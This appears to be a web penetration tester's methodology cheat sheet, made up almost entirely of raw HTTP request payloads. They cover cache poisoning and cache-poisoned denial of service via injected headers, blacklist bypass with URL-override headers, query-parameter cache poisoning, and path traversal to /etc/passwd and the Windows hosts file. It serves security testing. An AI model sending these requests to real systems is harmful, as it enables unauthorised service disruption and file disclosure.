### My Methodology for Testing and Exploiting Web Vulnerabilities

#### 1. **Cache Poisoning via Header Injection**
   - **X-Forwarded-Host and X-Forwarded-Scheme:**
     - **Objective:** Achieve cache poisoning.
     - **Method:**
       - Inject `X-Forwarded-Host` and `X-Forwarded-Scheme` headers with malicious values.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Forwarded-Scheme: nothttps
         X-Forwarded-Host: RandomString(10).id.burpcollaborator.net
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **X-Host:**
     - **Objective:** Achieve cache poisoning or XSS.
     - **Method:**
       - Inject `X-Host` header with a malicious value.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Host: RandomString(10).id.burpcollaborator.net
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

#### 2. **Cache-Poisoned Denial-of-Service (CPDoS) via Header Injection**
   - **X-Oversized-Header-Number:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject oversized headers to exhaust server resources.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Oversized-Header-1: xxxxx 20K xxxx
         X-Oversized-Header-2: xxxxx 20K xxxx
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **X-Metachar-Header:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject metacharacters in the header to cause parsing issues.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Metachar-Header: \n
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **X-HTTP-Method-Override:**
     - **Objective:** Achieve RCE or CPDoS.
     - **Method:**
       - Override the HTTP method to trigger unexpected behavior.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-HTTP-Method-Override: PUT
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **X-Forwarded-Port:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject `X-Forwarded-Port` with a non-standard port number.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Forwarded-Port: 123
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **X-Forwarded-SSL:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject `X-Forwarded-SSL` with a non-standard value.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Forwarded-SSL: off
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **Max-Forwards:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Set `Max-Forwards` to 0 to prevent further forwarding.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Max-Forwards: 0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **zTransfer-Encoding, Transfer-Encoding:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject `zTransfer-Encoding` or `Transfer-Encoding` with invalid values.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         zTransfer-Encoding: xxxx
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **Accept_Encoding:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject `Accept_Encoding` with an invalid value.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Accept_Encoding: xxxx
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **Range:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject `Range` with an invalid byte range.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Range: bytes=cow
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **User-Agent:**
     - **Objective:** Achieve CPDoS.
     - **Method:**
       - Inject an oversized `User-Agent` header.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: xxxx 20K xxxx
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

   - **Connection, Proxy-Authorization, TE, Upgrade, Proxy-Authenticate:**
     - **Objective:** Abuse hop-by-hop headers.
     - **Method:**
       - Inject hop-by-hop headers to disrupt the connection.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Connection: close, Cookie
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

#### 3. **Bypassing Blacklists via Header Injection**
   - **X-Original-URL, X-Override-URL, X-Rewrite-URL:**
     - **Objective:** Bypass blacklisted endpoints.
     - **Method:**
       - Inject headers to override the requested URL.
       - Example:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         X-Original-URL: /Internal-Endpoint
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

#### 4. **Denial of Service (DoS) via URL Encoding**
   - **Objective:** Perform a DoS attack by injecting large encoded strings.
   - **Method:**
     - Use URL-encoded characters to create a large request.
     - Example:
       ```http
       GET /Endpoint-To-Proxy/%xxx 20k xxx HTTP/1.1
       Host: www.company.com
       User-Agent: Mozilla/5.0
       Referer: https://previous.com/path
       Origin: https://www.company.com
       Connection: keep-alive
       ```

#### 5. **Cache Poisoning via Query Parameters**
   - **Objective:** Achieve cache poisoning by manipulating query parameters.
   - **Method:**
     - Add or modify query parameters to inject malicious values.
     - Examples:
       - Adding a new parameter:
         ```http
         GET /Endpoint-To-Proxy?parameter=cache HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         ```
       - Adding a large value to an existing parameter:
         ```http
         GET /Endpoint-To-Proxy?parameter=xxxx 20K xxxx HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         ```
       - Using different parameter formats:
         ```http
         GET /Endpoint-To-Proxy?_parameter=cache HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         ```
         ```http
         GET /Endpoint-To-Proxy;parameter=cache HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         ```
       - Adding a body to a GET request:
         ```http
         GET /Endpoint-To-Proxy HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         parameter=cache
         ```
       - Changing the method to POST and adding a body:
         ```http
         POST /Endpoint-To-Proxy HTTP/1.1
         Host: company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         Connection: keep-alive
         _parameter=cache
         ```

#### 6. **Path Traversal and Directory Browsing**
   - **Objective:** Access sensitive files or directories.
   - **Method:**
     - Use path traversal techniques to navigate to internal files.
     - Examples:
       - Using `/../`:
         ```http
         GET /Endpoint-To-Proxy/../../../../../../../etc/passwd HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```
       - Using `;/../`:
         ```http
         GET /../../../../../../../etc/passwd;/../Endpoint-To-Proxy HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```
       - Using `..\..\..`:
         ```http
         GET /Endpoint-To-Proxy/..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```
       - Using `%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c`:
         ```http
         GET /Endpoint-To-Proxy/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Internal-Endpoint HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```
       - Using `/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts`:
         ```http
         GET /Endpoint-To-Proxy/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```
       - Using `dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#`:
         ```http
         GET /Endpoint-To-Proxy/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/# HTTP/1.1
         Host: www.company.com
         User-Agent: Mozilla/5.0
         Referer: https://previous.com/path
         Origin: https://www.company.com
         ```

By following these methodologies, you can systematically test and exploit various web vulnerabilities, including cache poisoning, denial of service, and path traversal. Each technique is designed to help identify and mitigate security weaknesses in web applications.